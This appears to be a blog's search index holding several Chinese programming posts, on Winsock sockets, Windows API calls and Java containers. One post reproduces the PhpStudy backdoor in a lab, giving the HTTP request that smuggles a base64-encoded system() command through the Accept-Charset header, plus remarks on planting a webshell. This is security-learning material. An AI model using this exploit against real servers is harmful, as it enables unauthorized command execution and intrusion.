<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>套接字编程学习</title>
      <link href="/2019/11/01/%E5%A5%97%E6%8E%A5%E5%AD%97%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/11/01/%E5%A5%97%E6%8E%A5%E5%AD%97%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="套接字编程学习"><a href="#套接字编程学习" class="headerlink" title="套接字编程学习"></a>套接字编程学习</h2><p>使用的是Windows的线程库，但是实现地较为简单和整体的架构也比较混乱，写一篇blog稍微总结一下。</p><hr><a id="more"></a> <h3 id="套接字概念"><a href="#套接字概念" class="headerlink" title="套接字概念"></a>套接字概念</h3><blockquote><p>套接字（socket）是一个抽象层，应用程序可以通过它发送或接收数据，可对其进行像对文件一样的打开、读写和关闭等操作。套接字允许应用程序将I/O插入到网络中，并与网络中的其他应用程序进行通信。网络套接字是IP地址与端口的组合。 </p></blockquote><blockquote><p>通信时，其中的一个网络应用程序将要传输的一段信息写入它所在主机的Socket中，该Socket通过网络接口卡的传输介质将这段信息发送给另一台主机的Socket中，使这段信息能传送到其他程序中。 </p></blockquote><p>用人话讲其实就是所谓套接字就是传输层的端点，两个传输层的连接过程是，先把要传输的数据传给套接字，让套接字去传输信息，另一个传输层的套接字接受这个信息。</p><h4 id="套接字的分类"><a href="#套接字的分类" class="headerlink" title="套接字的分类"></a>套接字的分类</h4><blockquote><p>流式套接字： 它提供了一种可靠的、面向连接的双向数据传输服务，实现了数据无差错、无重复的发送。 也就是说流式套接字建立了一种安全可靠的连接。（TCP）</p></blockquote><blockquote><p>数据报套接字： 它提供了一种无连接、不可靠的双向数据传输服务。数据包以独立的形式被发送，并且保留了记录边界，不提供可靠性保证。 （UDP）</p></blockquote><blockquote><p>原始套接字: 该套接字允许对较低层协议（如IP或ICMP）进行直接访问，常用于网络协议分析，检验新的网络协议实现，也可用于测试新配置或安装的网络设备。 </p></blockquote><hr><h3 id="套接字编程流程"><a href="#套接字编程流程" class="headerlink" title="套接字编程流程"></a>套接字编程流程</h3><p>先上一个套接字编程的流程图</p><p><img src="https://s2.ax1x.com/2019/11/01/KH67WR.jpg" alt="套接字编程流程图"></p><p>然后介绍一下具体的流程</p><p>Server:</p><blockquote><p>引用头文件和加载动态链接库</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"winsock2.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment (lib,<span class="meta-string">"ws2_32.lib"</span>)</span></span><br></pre></td></tr></table></figure><blockquote><p>指定套接字版本并初始化动态链接库</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WSADATA WSAData;</span><br><span class="line">WORD SocketVersion = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">WSAStartup(SocketVersion,&amp;WSAData);</span><br></pre></td></tr></table></figure><blockquote><p>建立一个套接字</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sListen = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br></pre></td></tr></table></figure><blockquote><p>配置套接字所需要的参数</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 12345</span></span><br><span class="line">server.sin_family = AF_INET;<span class="comment">/*使用IPV4*/</span></span><br><span class="line">server.sin_port = htons(PORT);<span class="comment">/*使用12345端口并把主机字节序转化为网络字节序*/</span></span><br><span class="line">server.sin_addr.s_addr = htonl(INADDR_ANY);<span class="comment">/*接受到本机所有网卡的数据*/</span></span><br></pre></td></tr></table></figure><blockquote><p>绑定一个套接字</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RetVal = bind(sListen,(struct sockaddr *)&amp;server,size);</span><br></pre></td></tr></table></figure><blockquote><p>设置监听</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen(sListen, maxnumber);</span><br></pre></td></tr></table></figure><blockquote><p>关闭连接与清除初始化动态链接库时分配的资源</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">closesocket(sListen);</span><br><span class="line">WSACleanup();</span><br></pre></td></tr></table></figure><p>Client:</p><blockquote><p>client与Server不同的地方有connect，连接服务器</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SOCKET sClient;</span><br><span class="line">SOCKADDR_IN server;</span><br><span class="line">connect(sClient, (struct sockaddr*) &amp; server, <span class="keyword">sizeof</span>(SOCKADDR_IN))</span><br></pre></td></tr></table></figure><hr><p>我写了一个可以客户端可以随意给服务端发消息，客户端可以通过指令和指定的另外的客户端发消息，但是因为线程不能创建线程，所以只能发一条回一条。</p><blockquote><p>首先创建一个线程用来接受所有客户端的消息。接受消息的同时会记录下该客户端的惟一标识号，便于之后查询当前在线用户和用户通信的实现。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">thread <span class="title">task01</span><span class="params">(receiveprocess, sClient)</span></span>;  <span class="comment">/*接收消息子线程*/</span></span><br><span class="line">task01.detach();</span><br></pre></td></tr></table></figure><p>顺便写一下detach和join的区别</p><blockquote><p>detach：主线程与子线程分离，子线程结束后，资源自动回收。</p><p>join：子线程合入主线程，主线程阻塞等待子线程结束，然后回收子线程资源。 </p></blockquote><p>说人话就是detach和主线程没关系，资源回收会由系统自动回收。join是主线程阻塞，等着回收该线程资源。</p><blockquote><p>在receiveprocess函数中我接受一个客户端的消息，但因为我接收消息使用的是一个公共的全局缓冲区，所以约等于接受所有客户端的消息。第二个语句将字符串末尾加上字符串结束符，保证字符串正确显示。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RetVal = recv(sClient, ReceiveBuff, MSGSIZE, <span class="number">0</span>);</span><br><span class="line">ReceiveBuff[RetVal] = <span class="string">'\0'</span>;</span><br></pre></td></tr></table></figure><blockquote><p>接着用户可以输入指令，在receiveprocess中将用户输入与固定字符串进行比对。比如用户输入communicate会与某个用户进行通信。（由服务器转发实现）</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(ReceiveBuff, communicate))<span class="comment">/*通过communicate指令与当前当前在线用户通信*/</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> want = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> a = findusernumber(sClient);<span class="comment">/*该用户唯一标识码*/</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"a = "</span> &lt;&lt; a &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">s = <span class="string">"请输入您的想要与谁通信"</span>;</span><br><span class="line">sendtouser(s, sClient);</span><br><span class="line">want = reciveonenumber(sClient, a);<span class="comment">/*该用户想要与谁通信*/</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt;<span class="string">"用户"</span>&lt;&lt;a&lt;&lt; <span class="string">"想与"</span> &lt;&lt; want &lt;&lt; <span class="string">"通信"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">communicateuseranduser(information[a].user, information[want].user, a, want);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>而服务端发消息只需要使用send函数即可，所以只要有用户提出通信请求，记录下该用户的唯一标识码和该用户想要通信的用户的唯一标识码，使用服务端的send函数可以实现服务端的转发。但是我还没有实现两个客户端之间可以随意所欲地发消息。如果想要随意所欲发消息，那么需要再创建两个线程，一个接收消息一个发送消息。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send(b, information[a1].ReceiveBuff, <span class="built_in">strlen</span>(information[a1].ReceiveBuff), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><blockquote><p>因为只有单线程进行通信，但又要同时接受和发送，我只能利用一个变量的自增。（有时间我改成双线程），information[i].ReceiveBuff是某一个用户私有的缓冲区，i是该用户在用户的数据结构中所处的序号。客户端发起通信请求–&gt;服务端接收请求并转发消息至另一个客户端–&gt;另一个客户端收到请求。由此可实现客户端与客户端的通信。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (flagp % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">receiveuseranduser(a, a1);</span><br><span class="line">flagp++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">receiveuseranduser(b, b1);</span><br><span class="line">flagp++;</span><br><span class="line">&#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">receiveuseranduser</span><span class="params">(SOCKET sClient,<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line"><span class="comment">/*接收线程消息函数*/</span></span><br><span class="line">RetVal = recv(sClient, information[i].ReceiveBuff, MSGSIZE, <span class="number">0</span>);</span><br><span class="line">information[i].ReceiveBuff[RetVal] = <span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>勉勉强强搭好了一个框，剩下的就是糊纸了。数据结构改一改就可以变成邮件管理系统什么的。</p><p>文件传输功能尚未完成，有时间就写（咕）。之后我会把优化版的代码贴上来，如果我想得起来的话。</p>]]></content>
      
      
      <categories>
          
          <category> 开发相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 套接字学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PhpStudy RCE漏洞复现</title>
      <link href="/2019/10/31/PhpStudy_RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/10/31/PhpStudy_RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="PhpStudy-RCE漏洞复现"><a href="#PhpStudy-RCE漏洞复现" class="headerlink" title="PhpStudy RCE漏洞复现"></a>PhpStudy RCE漏洞复现</h2><p>PhpStudy后门时间出现了挺长一阵子了，我一直没有进行复现，今天尝试复现一下。<br><a id="more"></a> </p><hr><h4 id="查看漏洞是否存在"><a href="#查看漏洞是否存在" class="headerlink" title="查看漏洞是否存在"></a>查看漏洞是否存在</h4><p>(1)phpStudy20161103版本后门位置存在位置</p><blockquote><p>*\phpStudy\php\php-5.2.17\ext\php_xmlrpc.dll</p><p>*\phpStudy\php\php-5.2.17\ext\php_xmlrpc.dll</p></blockquote><p>(2)phpStudy20180211后门位置存在于：</p><blockquote><p>*:\PHPTutorial\PHP\PHP-5.2.17\ext\php_xmlrpc.dll</p><p>*:\PHPTutorial\PHP\PHP-5.4.45\ext\php_xmlrpc.dll</p></blockquote><p>查找dll文件中的”@eval”</p><p><img src="https://s2.ax1x.com/2019/10/31/KTUC7V.png" alt="查找结果"></p><p>可见存在后门在169行</p><blockquote><p>顺便说一下，Windows的powershell无法使用grep，所以只能用Select-String进行替代。</p></blockquote><p>以下为PowerShell中可以替代grep的三种命令，but亲测findstr不能用。</p><p><img src="https://s2.ax1x.com/2019/10/31/KTUo34.png" alt="findstr报错"></p><blockquote><p>findstr：           cat .\create.tf  |findstr alicloud_slb<br>where：            cat .\create.tf  |where {$_ -match “alicloud_slb”}<br>Select-String： Select-String “alicloud_slb” .\create.tf</p></blockquote><hr><h4 id="搭建PhpStudy靶机环境"><a href="#搭建PhpStudy靶机环境" class="headerlink" title="搭建PhpStudy靶机环境"></a>搭建PhpStudy靶机环境</h4><p>首先在靶机搭建phpstudy网站，在攻击机看是否可以访问</p><p><img src="https://s2.ax1x.com/2019/10/31/KTUTgJ.png" alt="phpinfo"></p><h4 id="验证过程"><a href="#验证过程" class="headerlink" title="验证过程"></a>验证过程</h4><p>攻击机开启bp进行抓包</p><blockquote><p>GET / HTTP/1.1</p><p>Host: 192.168.179.1</p><p>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;x64; rv:69.0) Gecko/20100101 Firefox/69.0</p><p>Accept:text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8</p><p>Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</p><p>Accept-Encoding: gzip,deflate</p><p>Accept-Charset:”commandbase64 string”</p><p>Connection: close</p><p>Upgrade-Insecure-Requests: 1</p><p>Cache-Control: max-age=0</p></blockquote><p>出现RCE漏洞的地方即Accept-Charset参数</p><p>system(“your command”);</p><p>将想要执行的命令放到your command中，对整条命令进行base64编码，放入Accept-Charset即可执行命令。</p><p>我连接超时了，结果发现是php_xmlrpc拓展没开，并且一定要保留请求体，在Cache-Control后面一定要至少敲两行回车，要不会请求超时。</p><p><img src="https://s2.ax1x.com/2019/10/31/KTUXE6.png" alt="结果"></p><p>然后直接一条龙，使用Phpstudy用户权限就是当前登陆用户权限，systeminfo看一波，netstat看一波端口，直接写webshell。(最近想再看看关于如何免杀，之前写的马msf12重编码依然被火绒拦……所以webshell这块之后再写)</p><p>之后顺便把后门删了(懒得搭windows虚拟机的我冒险用物理机以身试险)</p><p><img src="https://s2.ax1x.com/2019/10/31/KTUzCD.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows API编程</title>
      <link href="/2019/10/30/Windows%20API%E7%BC%96%E7%A8%8B/"/>
      <url>/2019/10/30/Windows%20API%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="Windows-API编程"><a href="#Windows-API编程" class="headerlink" title="Windows API编程"></a>Windows API编程</h2><blockquote><p>题目：使用 Windows 核心 API 实现以下程序 </p><ol><li>程序 1：该程序能够创建一个本机的 OllyDbg 进程（使用 CreateProcess，显式指定 OllyDbg 可执行文件的路径） </li><li>程序 2：<br>a) 该程序能够创建一个线程，显示 MessageBox<br>b) 在以上子线程中，编程获得 kernel32.dll 在当前系统中的路径信息，作为内容显示在以上的 MessageBox 中<br>c) 在以上子线程中，编程获得子线程所加载 kernel32.dll 中的GetCurrentThreadId()函数的地址，调用该函数，获得子线程的线程编号，将线程编号连接到上一问的 kernel32.dll路径后面，再将连接结果字符串显示在 MessageBox 中<a id="more"></a> </li></ol></blockquote><hr><blockquote><p>程序1解决方案<br>此题明白CreateProcess的参数即可<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR commandLine[] = TEXT(<span class="string">"C:\\Users\\dell\\Desktop\\常用\\吾爱破解专用版Ollydbg\\原版\\英文原版\\OLLYDBG.EXE"</span>);</span><br><span class="line">    STARTUPINFO si = &#123;<span class="keyword">sizeof</span>(si)&#125;;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    <span class="keyword">bool</span> bRet = CreateProcess(</span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//应用程序名称，指向启动进程的 exe 文件 </span></span><br><span class="line">        commandLine,<span class="comment">//命令行字符串，是启动进程的命令行中的参数。</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//进程的安全属性 ，指向 SECURITY_ATTRIBUTES 结构变量，是进程的安全属性，可以为 NULL 则使用默认的安全属性</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//线程的安全属性 ，指向 SECURITY_ATTRIBUTES 结构变量。 </span></span><br><span class="line">        FALSE,<span class="comment">/*是否继承父进程属性 ，表示新进程是否从调用进程处继承了句柄。如果参数的值为 TRUE，调用进程中的每一个可继</span></span><br><span class="line"><span class="comment">承的打开句柄都将被子进程继承。被继承的句柄与原进程拥有完全相同的值和访问权限；如果设为 FALSE，那么不继承。 */</span> </span><br><span class="line">        CREATE_NO_WINDOW,<span class="comment">//创建标志，表示进程的创建标志以及优先级控制。 </span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//指向新的环境块的指针，指向新进程的环境变量块，如果设置为 NULL，那么使用父进程的环境变量。 </span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//指向当前目录名的指针 ，指定创建后新进程的当前目录，如果设置为 NULL，那么就在父进程所在的当前目录。 </span></span><br><span class="line">        &amp;si,<span class="comment">// 传递给新进程的信息，指向一个 STARTUPINFO 结构，该结构里可以设定启动信息，可以设置为 NULL 。</span></span><br><span class="line">        &amp;pi<span class="comment">//进程返回的信息，指向一个 PROCESS_INFORMATION 结构，返回被创建进程的信息。</span></span><br><span class="line">);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><hr><blockquote><p>程序2解决方案<br>学会调用Windows api即可（面向搜索引擎编程），我注释写的很详尽了<br>但是有一点投机取巧，我没有使用Windows api去搜索kernel32.dll路径，我是获取系统路径，如果是windows系统，那么kernel32.dll一定会在System32文件夹中。正确的做法应该还要再加一步确定kernel32.dll是否在System32文件夹中。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">getDllFuncAddr</span><span class="params">(<span class="keyword">char</span>* dllName, <span class="keyword">char</span>* funcName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HMODULE h = LoadLibrary(dllName);</span><br><span class="line"><span class="keyword">long</span> addr = (<span class="keyword">long</span>)GetProcAddress(h, funcName);</span><br><span class="line">FreeLibrary(h);</span><br><span class="line"><span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">Thread1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">long</span> address;</span><br><span class="line"><span class="keyword">int</span> number;</span><br><span class="line"><span class="keyword">char</span> str[<span class="number">10</span>]=<span class="string">"\0"</span>;</span><br><span class="line"><span class="keyword">char</span> path[MAX_PATH];</span><br><span class="line"><span class="keyword">char</span> name[] = <span class="string">"\\kernel32.dll;id="</span>; </span><br><span class="line"><span class="keyword">char</span> str1[] = <span class="string">"kernel32.dll"</span>;</span><br><span class="line"><span class="keyword">char</span> str2[] = <span class="string">"GetCurrentThreadId"</span>;</span><br><span class="line">    GetSystemDirectory(path,MAX_PATH);<span class="comment">/*获取当前系统路径*/</span></span><br><span class="line">    <span class="built_in">strcat</span>(path,name);<span class="comment">/*因为kernel32.dll一定在系统目录system32下，所以只需要获取system32路径即可*/</span></span><br><span class="line">address = getDllFuncAddr(str1, str2);<span class="comment">/*保存函数地址*/</span> </span><br><span class="line">number = ((<span class="keyword">long</span>(*)())address)();<span class="comment">/*把address强制转化为指针类型并用其调用函数*/</span> </span><br><span class="line">ltoa(number,str,<span class="number">10</span>); <span class="comment">/*把id号放入一个字符串*/</span> </span><br><span class="line"><span class="built_in">strcat</span>(path,str);<span class="comment">/*字符串连接*/</span> </span><br><span class="line">MessageBox ( <span class="literal">NULL</span>, TEXT (path), TEXT (<span class="string">"Win_prog"</span>), MB_OK ) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">CreateThread(<span class="literal">NULL</span>,<span class="number">0</span>,(LPTHREAD_START_ROUTINE)Thread1,<span class="literal">NULL</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">HANDLE  CreateThread(</span></span><br><span class="line"><span class="comment">   LPSECURITY_ATTRIBUTES lpThreadAttributes, //线程安全性描述（一个结构体，一般是NULL）</span></span><br><span class="line"><span class="comment">   SIZE_T dwStackSize,                      //一种数值（栈深度，一般是0）   </span></span><br><span class="line"><span class="comment">   LPTHREAD_START_ROUTINE lpStartAddress,  //启动函数</span></span><br><span class="line"><span class="comment">   _In_opt_ __drv_aliasesMem LPVOID lpParameter, // 附加参数（一般为NULL）</span></span><br><span class="line"><span class="comment">    _In_ DWORD dwCreationFlags,          //运行参数（是否在创建完成后就启动线程</span></span><br><span class="line"><span class="comment">   _Out_opt_ LPDWORD lpThreadId   // 返回句柄（一般是0，或者是一个DWORD型变量的地址，别忘了&amp;）</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="comment">/*防止主进程结束导致子线程被kill*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>参考资料：<br><strong> C语言 ( <em> ( void ( </em> ) ( ) ) 0 ) ( ) 的理解:<br><a href="https://blog.csdn.net/fengfeng0328/article/details/85949805" target="_blank" rel="noopener">https://blog.csdn.net/fengfeng0328/article/details/85949805</a> </strong><br><strong> 获取指定dll中的某个函数的地址:<br><a href="https://blog.csdn.net/leng_que/article/details/4668787" target="_blank" rel="noopener">https://blog.csdn.net/leng_que/article/details/4668787</a> </strong><br><strong> WindowsAPI使用详解——GetWindowsDirectory|GetSystemDirectory 获取操作系统文件夹的路径:<br><a href="https://www.cnblogs.com/callback/p/4248038.html" target="_blank" rel="noopener">https://www.cnblogs.com/callback/p/4248038.html</a> </strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 开发相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows API编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java-容器学习</title>
      <link href="/2019/10/28/Java-%E5%AE%B9%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/10/28/Java-%E5%AE%B9%E5%99%A8%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="Java-容器学习"><a href="#Java-容器学习" class="headerlink" title="Java 容器学习"></a>Java 容器学习</h2><blockquote><p>容器，就是一种Java中的可以容纳各种对象的数据结构，容器可以储存各种对象：例如String、int都可以，如果不确定要让容器接受哪一种对象，可以使用泛型来替代。但是如果使用泛型，如果往容器里存Integer、String两种甚至更多种不同的对象，虽然编译器不会报错，但是会报出有安全问题警告，所以尽量还是直接指定存储哪一种对象，而非使用泛型。<br><a id="more"></a></p></blockquote><hr><blockquote><p>使用容器需要先import,容器都在java.uti中。<br>容器种类：<br>可以大概分为四种类型：List、Set、Map、迭代器等等。</p></blockquote><ul><li>列表（List）：</li></ul><p>定义：List<e>mylist = new ArrayList<e>();</e></e></p><ul><li>集合（Set）:</li></ul><p>定义：Set<integer>myset = new HashSet<integer>();<br>集合中不能有重复的元素</integer></integer></p><ul><li>映射（Map）</li></ul><p>定义：Map &lt;String,Integer&gt;keywords  = new HashMap&lt;String,Integer&gt;();<br>类似Python里面的字典，有键值对。</p><ul><li>迭代器</li></ul><p>定义：Iterator<string> it = actionSet.iterator();<br>使用迭代器可以方便的对容器里的内容进行遍历，因为容器不能通过下标等进行操作。</string></p><hr><blockquote><p>在JDK文档中查阅Stack接口，尝试用封装LinkedList的方式实现一个Stack容器<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">homework5_3</span>&lt;E&gt; <span class="title">extends</span> <span class="title">LinkedList</span>&lt;E&gt;&#123;</span></span><br><span class="line"><span class="keyword">private</span> LinkedList&lt;E&gt; LinkedListstack = <span class="keyword">new</span> LinkedList&lt;E&gt;();</span><br><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(LinkedListstack.isEmpty())</span><br><span class="line"><span class="keyword">return</span> null;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> LinkedListstack.removeLast();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">LinkedListstack.addLast(e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> boolean <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> LinkedListstack.isEmpty();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">peek</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(isEmpty())&#123;</span><br><span class="line"><span class="keyword">return</span> null;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> LinkedListstack.getLast();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">homework5_3 <span class="built_in">stack</span> = <span 